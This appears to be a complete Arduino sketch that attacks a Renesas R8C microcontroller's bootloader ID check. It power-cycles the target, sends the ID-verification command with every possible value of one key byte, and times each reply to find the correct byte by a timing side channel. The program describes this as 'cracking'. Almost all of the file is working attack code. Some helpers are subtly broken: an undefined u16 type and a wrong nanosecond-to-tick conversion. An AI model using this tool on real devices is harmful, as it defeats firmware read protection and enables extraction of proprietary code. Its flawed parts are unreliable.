#include <SoftwareSerial.h>
#include <avr/interrupt.h>
#include <avr/io.h>
#include <stdint.h>

typedef uint8_t u8;
typedef uint32_t u32;

#ifdef DEBUG
#define digitalWrite(x, y) (1)
#define pinMode(x, y) (1)
#define digitalRead(x) (1)
#endif

//////////////////////////////////////////////////
////////////////// Config parameters /////////////
//////////////////////////////////////////////////

namespace HW {
// Harware definitions
constexpr u8 MODE = 8;
constexpr u8 RESET = 4;
constexpr u8 VDD_SWICH = 5;
constexpr u8 RX_1 = 3;
constexpr u8 TX_1 = 9;
constexpr u8 BLANK = 12;
constexpr u8 BUTTON = 11;
} // namespace HW

namespace UART {
// Baudrate for uart
constexpr u16 PC_BAUD = 9600;
constexpr u16 RNS8_BAUD = 9600;
} // namespace UART

//////////////////////////////////////////////////

namespace RST {
// Reset pin
static u8 rst_prev = 1;
void off() {
  digitalWrite(HW::RESET, 1);
  rst_prev = 1;
}
void on() {
  digitalWrite(HW::RESET, 0);
  rst_prev = 0;
}
} // namespace RST

namespace MODE {
// Mode pin
static uint8_t mode_prev = 1;
void bootloader() {
  digitalWrite(HW::MODE, 1);
  mode_prev = 1;
}
void program() {
  digitalWrite(HW::MODE, 0);
  mode_prev = 0;
}
} // namespace MODE

namespace VDD {
void on() {
  MODE::bootloader();
  digitalWrite(HW::TX_1, HIGH);
  digitalWrite(HW::MODE, MODE::mode_prev);
  digitalWrite(HW::RESET, RST::rst_prev);
  digitalWrite(HW::VDD_SWICH, LOW);
}
void off() {
  digitalWrite(HW::TX_1, LOW);
  digitalWrite(HW::MODE, HIGH);
  digitalWrite(HW::RESET, HIGH);
  digitalWrite(HW::VDD_SWICH, HIGH);
}
} // namespace VDD

namespace DELAY {
static u32 counter_ov_cnt;
constexpr u8 CLK_DIV_1 = 1 << 0;

void _start() { TCCR2B = CLK_DIV_1; }
void _stop() { TCCR2B = 0x00; }
void _clear() {
  TCNT2 = 0x00;
  counter_ov_cnt = 0;
}
void _overflow_int() { TIMSK2 = 0x01; }

void init() {
  _stop();
  _clear();
  _overflow_int();
}

void _delay(u32 ticks) {
  counter_ov_cnt = 0;
  _clear();
  _start();
  auto cnt_ticks = []() { return counter_ov_cnt | TCNT2; };
  while (cnt_ticks() < ticks)
    ;
  _stop();
}

void ns(u32 duration_ns) {
  u32 ticks = duration_ns / F_CPU;
  _delay(ticks);
}

void us(u32 duration_us) {
  constexpr u32 us_to_ns = 1000;
  constexpr u32 max_value = static_cast<u32>(-1);
  u32 d_ns =
      (duration_us < max_value - us_to_ns) ? duration_us * us_to_ns : max_value;
  ns(d_ns);
}

void ms(u16 duration_ms) {
  constexpr u32 ms_to_us = 1000;
  constexpr u32 max_value = static_cast<u32>(-1);
  u32 duration = static_cast<u32>(duration_ms);
  u32 d_us =
      (duration < max_value - ms_to_us) ? duration * ms_to_us : max_value;
  us(d_us);
}

void s(u8 duration_s) {
  constexpr u32 s_to_ms = 1000;
  constexpr u32 max_value = static_cast<u32>(-1);
  u32 duration = static_cast<u32>(duration_s);
  u32 d_ms = (duration < max_value - s_to_ms) ? duration * s_to_ms : max_value;
  ms(d_ms);
}

} // namespace DELAY

// timer 2 overflow
ISR(TIMER2_OVF_vect) { DELAY::counter_ov_cnt += (1 << 8); }

namespace INT {
static u16 noOfTicks;
void stop();

void startTimer1() {
  // Set counter value to 0
  TCNT1 = 0x00;
  // Reset TCCR1A options since Arduino likes to enable some of them.
  TCCR1A = 0x00;
  // Set timer to normal mode and set prescaler to 1.
  TCCR1B = 0x01;
}

void stopTimer1() { TCCR1B = 0x00; }

unsigned int getTimerTicks() { return TCNT1; }

void start() {
  startTimer1();
  while (digitalRead(HW::RX_1))
    ;
  stop();
}

void stop() {
  stopTimer1();
  noOfTicks = getTimerTicks();
}

} // namespace INT

SoftwareSerial targetSerial(HW::BLANK, HW::TX_1);
unsigned int send_1byte(uint8_t key) {
  uint8_t zero = 0x00;

  for (int i = 0; i < 16; i++) {
    targetSerial.write(zero);
    delay(40);
  }

  // send header
  const uint8_t header[] = {0xf5, 0xdf, 0xff, 0x00, 0x07};
  for (uint8_t el : header) {
    targetSerial.write(el);
  }

  // send key

  targetSerial.write(key);
  targetSerial.write(zero);
  targetSerial.write(zero);
  targetSerial.write(zero);
  targetSerial.write(zero);
  targetSerial.write(zero);
  targetSerial.write(zero);

  // send query
  targetSerial.write(0x70);

  // Start interrupt on falling edge
  INT::start();

  // Delay for max timeout (4ms)
  delay(4);

  return INT::noOfTicks;
}

void send_256_bytes() {
  unsigned int max_value = 0;
  unsigned int max_digit = 0;
  for (unsigned int k = 0; k < 256; k++) {
    unsigned int required_time = send_1byte(k);

    // reset after sending

    delay(200);
    RST::off();
    delay(200);
    RST::on();
    delay(200);

    Serial.print("Sending: ");
    Serial.print(k);
    Serial.print(" required time: ");
    Serial.println(required_time);

    if (max_value < required_time) {
      max_value = required_time;
      max_digit = k;
    }
  }
  Serial.print("Max digit: ");
  Serial.println(max_digit);
}

void reset_target() {
  MODE::program();
  delay(300);
  RST::off();
  delay(300);
  RST::on();
  delay(300);
  VDD::off();
  delay(400);
}

void bootload_target() {
  // Start
  VDD::on();
  delay(300);
  VDD::on();
  delay(300);
  MODE::program();
  delay(300);

  // We send R8C to normall working.

  RST::off();
  delay(300);
  RST::on();
  delay(500);
  VDD::off();

  delay(1000);

  // We send R8C to bootloader.
  VDD::on();
  delay(300);
  MODE::bootloader();
  delay(300);
  RST::off();
  delay(300);
  RST::on();
  delay(300);
}

////////////////////////////////////////////////////////////////////
/////////////////////////// ARDUINO ////////////////////////////////
////////////////////////////////////////////////////////////////////

void setup() {
  Serial.begin(UART::PC_BAUD);
  targetSerial.begin(UART::RNS8_BAUD);
  DELAY::init();

  pinMode(HW::MODE, OUTPUT);
  pinMode(HW::RESET, OUTPUT);
  pinMode(HW::VDD_SWICH, OUTPUT);
  pinMode(HW::BUTTON, INPUT);
  pinMode(HW::RX_1, INPUT_PULLUP);
}

void loop() {
  Serial.println("Press button to start cracking process.");

  while (digitalRead(HW::BUTTON) == HIGH)
    ;

  Serial.println("Start of process");
  delay(400);

  bootload_target();
  send_256_bytes();
  reset_target();

  Serial.println("End of process");

  while (1)
    ;
}
